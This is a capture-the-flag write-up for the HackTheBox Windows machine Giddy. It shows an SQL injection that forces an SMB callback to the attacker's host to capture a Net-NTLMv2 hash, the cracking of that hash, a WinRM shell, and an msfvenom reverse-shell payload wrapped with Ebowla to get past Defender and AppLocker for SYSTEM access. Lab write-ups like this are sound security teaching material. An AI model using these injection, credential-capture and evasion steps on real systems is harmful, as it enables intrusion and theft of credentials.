---
title: HTB: Giddy
url: https://0xdf.gitlab.io/2019/02/16/htb-giddy.html
date: 2019-02-16T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: hackthebox, ctf, htb-giddy, sqli, sqlmap, winrm, net-ntlmv2, responder, hashcat, unifivideo, defender, ebowla, smbserver, applocker, powershell-web-access
---

![](https://0xdfimages.gitlab.io/img/giddy-cover.png)I thought Giddy was a ton of fun. It was a relateively straight forward box, but I learned two really neat things working it (each of which inspired [other](/2018/11/08/powershell-history-file.html) [posts](/2019/01/13/getting-net-ntlm-hases-from-windows.html)). The box starts with some enumeration that leads to a site that gives inventory. I’ll abuse an SQL-Injection vulnerability to get the host to make an SMB connect back to me, where I can collect Net-NTLMv2 challenge response, and crack it to get a password. I can then use either the web PowerShell console or WinRM to get a shell. To get system, I’ll take advantage of a vulnerability in Ubiquiti UniFi Video.

## Box Info

| Name | [giddy](https://hackthebox.com/machines/giddy)  [giddy](https://hackthebox.com/machines/giddy) [Play on HackTheBox](https://hackthebox.com/machines/giddy) |
| --- | --- |
| Release Date | 08 Sep 2018 |
| Retire Date | 16 Feb 2019 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for giddy |
| Radar Graph | Radar chart for giddy |
| First Blood User | 00:58:33[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| First Blood Root | 02:37:07[no0ne no0ne](https://app.hackthebox.com/users/21927) |
| Creator | [lkys37en lkys37en](https://app.hackthebox.com/users/709) |

## Recon

### nmap

`nmap` gives me web (80 and 443), remote desktop (3389), and WinRM (5985).

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.104
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-31 07:57 EDT
Nmap scan report for 10.10.10.104
Host is up (0.022s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 13.87 seconds
root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.104
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-31 07:58 EDT
Nmap scan report for 10.10.10.104
Host is up (0.022s latency).
All 65535 scanned ports on 10.10.10.104 are open|filtered

Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
root@kali# nmap -sC -sV -p 80,443,3389,5985 -oA nmap/scripts 10.10.10.104
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-31 07:59 EDT
Nmap scan report for 10.10.10.104
Host is up (0.021s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2018-10-31T11:54:33+00:00; -5m44s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2018-06-16T01:04:03
|_Not valid after:  2018-12-16T01:04:03
|_ssl-date: 2018-10-31T11:54:33+00:00; -5m44s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -5m44s, deviation: 0s, median: -5m44s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds

```

### Website - port 80/443

#### Site

Both the http and https sites just have a dog hanging out the window:

![1540988846875](https://0xdfimages.gitlab.io/img/1540988846875.png)

#### gobuster

Two interesting paths on both http and https:

```

root@kali# gobuster -u http://10.10.10.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,asp,aspx,html -t 40

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.104/
[+] Threads      : 40
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : aspx,html,txt,asp
[+] Timeout      : 10s
=====================================================
2018/10/31 08:22:21 Starting gobuster
=====================================================
/remote (Status: 302)
/mvc (Status: 301)
/Remote (Status: 302)
=====================================================
2018/10/31 08:32:47 Finished
=====================================================

root@kali# gobuster -k -u https://10.10.10.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,asp,aspx,html -t 40

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.104/
[+] Threads      : 40
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,asp,aspx,html
[+] Timeout      : 10s
=====================================================
2018/10/31 08:36:08 Starting gobuster
=====================================================
/remote (Status: 302)
/mvc (Status: 301)
/Remote (Status: 302)
=====================================================
2018/10/31 08:51:09 Finished
=====================================================

```

#### /remote

The `/remote` uri gives a login to a Windows PowerShell Web Access screen for Windows 2016:

![1549824958819](https://0xdfimages.gitlab.io/img/1549824958819.png)

With no creds yet, I’ll move on from this for now.

#### /mvc

The `/mvc` uri takes me to a skeleton for a online store:

![1549825042539](https://0xdfimages.gitlab.io/img/1549825042539.png)

## Shell As Stacy

### Identify SQLi

There’s two points in the site where I can make the site crash which may be the precursor to a SQL Injection vulnerability:
- `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8`

  Visit `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8'`

  ![1549905907717](https://0xdfimages.gitlab.io/img/1549905907717.png)

</picture>
- `https://10.10.10.104/mvc/Search.aspx`

  Search for `test'`:

  ![1549905861409](https://0xdfimages.gitlab.io/img/1549905861409.png)

</picture>

### Dump Lots of Data

I can break out `sqlmap` here to dump lots of data out of the database:

```

root@kali# sqlmap -r product.request --dbms mssql --risk 3 --level 5 --batch --dbs

```

I won’t dwell here, as I didn’t find anything useful in the data.

### Get Net-NTLM

What I can do with this injection is to get the host to connect to me and try to authenticate using smb. I wrote a [blog post about getting creds via Net-NTLMv2](/2019/01/13/getting-net-ntlm-hases-from-windows.html), and one of the examples I showed was using database access to get a machine to send an authentication challenge my way. [This article](https://www.gracefulsecurity.com/sql-injection-out-of-band-exploitation/) goes into even more detail. Check out both of those for more details.

Because Windows allows stacked queries, I can just add `; EXEC master ..xp_dirtree '\\10.10.14.5\test'; --` to my injection point. So I’ll visit the following url: `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\10.10.14.5\test%22;%20--` to get the machine to send an SMB connection my way.

I can listen with impacket’s `smbserver` or with `responder` to catch the requests (if you use `smbserver`, make sure the share name matches):

```

root@kali# impacket-smbserver test .
Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.104,49763)
[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
[*] User Stacy\GIDDY authenticated successfully
[*] Stacy::GIDDY:4141414141414141:9e689e7a25290644d8d52351a00f1756:010100000000000000c2354ecc71d40187b2c849ae5583f9000000000100100070006700790052006100540046004a0002001000620045006a0058004a0043004a005a000300100070006700790052006100540046004a0004001000620045006a0058004a0043004a005a000700080000c2354ecc71d401060004000200000
008003000300000000000000000000000003000002f83ca85d5d698fbc34e27c0b8c48ee78f57ef75dae3d814cc2a86a602ebffce0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000                                                                                    
[*] AUTHENTICATE_MESSAGE (GIDDY\Stacy,GIDDY)
[*] User Stacy\GIDDY authenticated successfully
[*] Stacy::GIDDY:4141414141414141:aa46112a474aa876ad0ac0958b7704f3:01010000000000008058ce4ecc71d401132867eba23b533c000000000100100070006700790052006100540046004a0002001000620045006a0058004a0043004a005a000300100070006700790052006100540046004a0004001000620045006a0058004a0043004a005a00070008008058ce4ecc71d401060004000200000
008003000300000000000000000000000003000002f83ca85d5d698fbc34e27c0b8c48ee78f57ef75dae3d814cc2a86a602ebffce0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000                                                                                    
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:TEST)
[*] Handle: [Errno 104] Connection reset by peer
[*] Closing down connection (10.10.10.104,49763)
[*] Remaining connections []

```

```

root@kali# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.3.9

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.5]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.104
[SMBv2] NTLMv2-SSP Username : GIDDY\Stacy
[SMBv2] NTLMv2-SSP Hash     : Stacy::GIDDY:8c3aba2433fe8b97:5A0665D2106B93CCB9FA43B62229F3F0:0101000000000000C0653150DE09D201206F3AF1F2D20E45000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000003000002F83CA85D5D698FBC34E27C0B8C48EE78F57EF75DAE3D814CC2A86A602EBFFCE0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003500000000000000000000000000

```

The challenge response will be different each time, but that’s ok. Take any one of them over to `hashcat` and get the password. NTLMv2 does include the username and computer name in the hashing, so I’ll make sure to include that:

```

$ hashcat -m 5600 stacy.ntlmv2.hash /usr/share/wordlists/rockyou.txt -o stacy.ntlmv2.cracked --force
hashcat (v4.0.1) starting...
...[snip]...
Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
Hash.Target......: STACY::GIDDY:8c3aba2433fe8b97:5a0665d2106b93ccb9fa4...000000
Time.Started.....: Thu Nov  1 06:27:41 2018 (1 sec)
Time.Estimated...: Thu Nov  1 06:27:42 2018 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  1618.0 kH/s (4.58ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 2695168/14344385 (18.79%)
Rejected.........: 0/2695168 (0.00%)
Restore.Point....: 2686976/14344385 (18.73%)
Candidates.#1....: xamuraix -> wykeisha
HWMon.Dev.#1.....: N/A

Started: Thu Nov  1 06:27:36 2018
Stopped: Thu Nov  1 06:27:44 2018

$ cat stacy.ntlmv2.cracked
STACY::GIDDY:8c3aba2433fe8b97:5a0665d2106b93ccb9fa43b62229f3f0:0101000000000000c0653150de09d201206f3af1f2d20e45000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d201060004000200000008003000300000000000000000000000003000002f83ca85d5d698fbc34e27c0b8c48ee78f57ef75dae3d814cc2a86a602ebffce0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000:xNnWo6272k7x

```

## WinRM - Shell as Stacy

I have two options to get a shell.

### PowerShell Web Access

I can use powershell web console:

![1541123850546](https://0xdfimages.gitlab.io/img/1541123850546.png)

![1541123917312](https://0xdfimages.gitlab.io/img/1541123917312.png)

### WinRM Directly

I can also connect directly to WinRM to execute commands. I like to use [Alamot’s Ruby winrm shell](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb). I’ll modify it to add in my username and password:

```

require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'http://10.10.10.104:5985/wsman',
  transport: :plaintext,
  user: 'stacy',
  password: 'xNnWo6272k7x',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")                                                                                                         
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end

```

Then I can run it:

```

root@kali# ruby winrm_shell.rb
PS giddy\stacy@GIDDY Documents> whoami
giddy\stacy     

```

And from there, get user.txt:

```

PS giddy\stacy@GIDDY desktop> type user.txt
10C1C275...

```

## Privesc to System

### Enumeration

Right away, I see a hint in Stacy’s documents folder, `unifivideo`:

```

PS giddy\stacy@GIDDY Documents> ls

    Directory: C:\Users\Stacy\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2018   9:36 AM              6 unifivideo     

```

### Unifi Video Exploit

On googling, there’s an [exploit for it](https://www.exploit-db.com/exploits/43390/). I just need to write a payload into `\programdata\unifi-video\taskkill.exe`, and then stop the service:

> Upon start and stop of the service, it tries to load and execute the file at “C:\ProgramData\unifi-video\taskkill.exe”. However this file does not exist in the application directory by default at all.
>
> By copying an arbitrary “taskkill.exe” to “C:\ProgramData\unifi-video" as an unprivileged user, it is therefore possible to escalate privileges and execute arbitrary code as NT AUTHORITY/SYSTEM.

### Create Payload

So I created a payload with `msfvenom` that will give me a reverse shell I can catch with `nc`:

```

root@kali# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o rev443.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev443.exe

```

I’ll move the file to Giddy using `smbserver`. For details on how to do that, check out my post on it, [PWK Notes: Post-Exploitation Windows File Transfers with SMB](/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html)

### Finding Service

To start and stop the service, I need to know the name. But I’m unable to get service information with many of the standard commands to do so:

```

PS giddy\stacy@GIDDY unifi-video> systeminfo                                              
systeminfo.exe : ERROR: Access denied                                                                     
    + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException      
    + FullyQualifiedErrorId : NativeCommandError
    
PS giddy\stacy@GIDDY Documents> cmd /c sc query
[SC] OpenSCManager FAILED 5:

Access is denied.

PS giddy\stacy@GIDDY Documents> net start
net.exe : System error 5 has occurred.

PS giddy\stacy@GIDDY Documents> Get-WmiObject Win32_Service
Access denied 
At line:1 char:1
+ Get-WmiObject Win32_Service
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException
    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand

```

It turns out I don’t have permissions to list services.

The simplest route is just to look in the registry. Since I am in PowerShell, I can simply `cd` into a registry hive and explore it:

```

PS giddy\stacy@GIDDY Documents> cd HKLM:\system\currentcontrolset\services
PS giddy\stacy@GIDDY HKEY_LOCAL_MACHINE\system\currentcontrolset\services> ls
...[snip]...
UniFiVideoService              Type            : 16                                                                                                                                                                                                      
                               Start           : 2                                                                                                                                                                                                       
                               ErrorControl    : 1                                                                                                                                                                                                       
                               ImagePath       : C:\ProgramData\unifi-video\avService.exe //RS//UniFiVideoService                                                                                                                                        
                               DisplayName     : Ubiquiti UniFi Video                                                                                                                                                                                    
                               DependOnService : {Tcpip, Afd}                                                                                                                                                                                            
                               ObjectName      : LocalSystem                                                                                                                                                                                             
                               Description     : Ubiquiti UniFi Video Service
...[snip]...

```

The output is quite long, but I can find the UniFiVideoService in there.

The alternative is much more interesting. This is where I learned of the [PSReadLine](https://docs.microsoft.com/en-us/powershell/module/psreadline/?view=powershell-6), which is saving history to a file by default for PowerShellv5 (check out the [blog post I wrote about it](/2018/11/08/powershell-history-file.html) at the time for more details). I can see what commands the user has run. I’ll start by getting the potential size:

```

PS giddy\stacy@GIDDY PSReadline> (Get-PSReadLineOption).MaximumHistoryCount
4096

```

Next, I’ll get the path to the file:

```

PS giddy\stacy@GIDDY Documents> (Get-PSReadLineOption).HistorySavePath
C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ServerRemoteHost_history.txt

```

For some reason (I can’t explain), that file doesn’t actually exist. But in the same directory, there is a history file:

```

PS giddy\stacy@GIDDY Documents> type \Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ServerRemoteHost_history.txt
Cannot find path 'C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ServerRemoteHost_history.txt' because it does not exist.
At line:1 char:1
+ type \Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSRead ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Stacy\...ost_history.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
    
PS giddy\stacy@GIDDY Documents> cd \Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\  
PS giddy\stacy@GIDDY psreadline> ls                                          

    Directory: C:\users\stacy\appdata\roaming\Microsoft\windows\powershell\psreadline

Mode                LastWriteTime         Length Name                                                 
----                -------------         ------ ----                                  
-a----        6/17/2018   9:48 AM            207 ConsoleHost_history.txt

```

Dumping that files shows the user has been playing with starting and stopping this service:

```

PS giddy\stacy@GIDDY psreadline> cat ConsoleHost_history.txt                                         
net stop unifivideoservice
$ExecutionContext.SessionState.LanguageMode
Stop-Service -Name Unifivideoservice -Force
Get-Service -Name Unifivideoservice
whoami
Get-Service -ServiceName UniFiVideoService

```

### Avoiding Defender / Applocker

Windows Defender will block a `msfvenom` payload, even if it’s just a shell as opposed to Meterpreter:

```

PS giddy\stacy@GIDDY unifi-video> .\taskkil.exe                    
Program 'taskkil.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\taskkil.exe                                                                        
+ ~~~~~~~~~~~~~.                                                     
At line:1 char:1                                                                                                  
+ .\taskkil.exe                                                   
+ ~~~~~~~~~~~~~   

```

There are many ways around this. I’ll use ebowla encoding. After cloning the repo, I’ll update `geneitc.config` for this case:

```

...[snip]...
    output_type = GO
...[snip]...
    payload_type = EXE
...[snip]...
    [[ENV_VAR]]
    
        username = ''
        computername = 'Giddy'
        homepath = ''
        homedrive = ''
        Number_of_processors = ''
        processor_identifier = ''
        processor_revision = ''
        userdomain = ''
        systemdrive = ''
        userprofile = ''
        path = ''
        temp = ''
...[snip]...

```

Next I’ll use `msfvenom` to create a payload (or use the one I was blocked with earlier), and then run it through Ebowla:

```

root@kali# python ebowla.py rev443.exe genetic.config
[*] Using Symmetric encryption
[*] Payload length 7168
[*] Payload_type exe
[*] Using EXE payload template
[*] Used environment variables:
        [-] environment value used: computername, value used: giddy
[!] Path string not used as pasrt of key
[!] External IP mask NOT used as part of key
[!] System time mask NOT used as part of key
[*] String used to source the encryption key: giddy
[*] Applying 10000 sha512 hash iterations before encryption
[*] Encryption key: 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c
[*] Writing GO payload to: go_symmetric_rev443.exe.go

root@kali# ./build_x64_go.sh output/go_symmetric_rev443.exe.go rev443-ebowla.exe
[*] Copy Files to tmp for building
[*] Building...
[*] Building complete
[*] Copy rev443-ebowla.exe to output
[*] Cleaning up
[*] Done

root@kali# file output/rev443-ebowla.exe
output/rev443-ebowla.exe: PE32+ executable (console) x86-64, for MS Windows

```

### Testing Payload

AppLocker is preventing the running of any exes. For example, `nc.exe`:

```

PS giddy\stacy@GIDDY unifi-video> copy \\10.10.14.5\smb\nc.exe a.exe                                  
PS giddy\stacy@GIDDY unifi-video> .\a.exe 10.10.14.5 443
Program 'a.exe' failed to run: This program is blocked by group policy. For more information, contact your system administratorAt line:1 char:1   

```

I’ll copy my Ebowla payload to Giddy. First, I’ll test it running out of `\windows\tasks\` as that is a good location to bypass AppLocker. That shows that the binary will run, bypassing the AV issues:

```

PS giddy\stacy@GIDDY unifi-video> \windows\tasks\taskkill.exe
[*] IV: e9634b290324e934b27ecbb2264815b4                            
[*] Size of encrypted_payload:  9600                
[*] Hash of encrypted_payload: 784bf8f21aef5712948cdccfe4f32466fb0d567075fe14e417182a55b056a5e285a639f67b00d5b7f10683725d9f74486ed365549f18c94fe9de121787cee5d1
[*] Number of keys: 1                                
[*] Final key_list: [giddy]                                  
==================================================      
[*] Key: giddy                                                           
[*] Computed Full Key @ 2710 iterations: 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c8a0e4c69b5ea1fba75d8bce580a3a7a51df239e28be0c36675dd065b1d4dd921
[*] AES Password 91798b223b0690d70e3934063458f6bd14279758a6fe1bc78ff0c7fdb489be0c
[*] Decoded Payload with Padding: 9ab1f2c2ae5c1bb5a1f15723f319df45bb1b808f6bd1eb239932e321ca0494ac74adb51e8d884802dcb64f14d222feaea08c4c9ce168a86f1e5b7e6460d339cd
[*] Message Length: 7168                                       
[*] Message Length w/ Padding: 7168                           
[*] Test Hash : 0d0cd7be4a6c5540ee0ced0fc6be2623ca3e02d816c12a51de8ba9b35a834b702cb8ce5f65539a34ee5486fd64ce652f9335875748283d9a1be1e4f69c35b677
Search Hash: 0d0cd7be4a6c5540ee0ced0fc6be2623ca3e02d816c12a51de8ba9b35a834b702cb8ce5f65539a34ee5486fd64ce652f9335875748283d9a1be1e4f69c35b677
[*] Hashes Match
Len full_payload: 7168                                              
[*] Key Combinations:  [[giddy]]    

```

### Exploit

Now that I know how to stop the service and have a binary that will get around AV, I can copy the binary to `\ProgramData\unifi-video\taskkill.exe`, and then stop the service:

```

PS giddy\stacy@GIDDY unifi-video> Stop-Service -Name Unifivideoservice -Force

```

I get a callback on `nc` as System:

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.104] 49845
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\ProgramData\unifi-video>whoami
whoami
nt authority\system

```

From there I can grab the flag:

```

C:\Users\Administrator\Desktop>type root.txt
type root.txt
CF559C6C...

```